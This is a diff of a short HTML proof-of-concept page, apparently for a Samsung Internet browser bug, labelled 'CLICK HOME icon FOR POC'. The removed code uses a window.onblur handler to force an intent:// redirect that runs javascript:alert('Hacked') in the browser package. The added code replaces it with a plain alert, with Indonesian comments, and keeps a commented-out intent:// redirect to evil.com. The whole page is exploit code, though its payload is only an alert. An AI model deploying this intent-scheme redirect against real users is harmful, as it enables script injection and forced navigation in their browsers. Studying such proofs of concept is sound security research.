@@ -1,17 +1,13 @@
 <html>
-
 <body>
 
 <script>
-
-window.onblur=function incognito() {
-
-
-location.replace('intent://javascript:alert('Hacked')#Intent;scheme=https;package=com.sec.android.app.sbrowser;end');
-
-
+// Fungsi untuk memunculkan popup alert saat halaman kehilangan fokus
+window.onblur = function() {
+  alert('Popup XSS: Halaman kehilangan fokus!');
+  // atau
+  // location.replace('intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end');
 }
-
 </script>
 
 <h1> CLICK HOME icon FOR POC </h1>
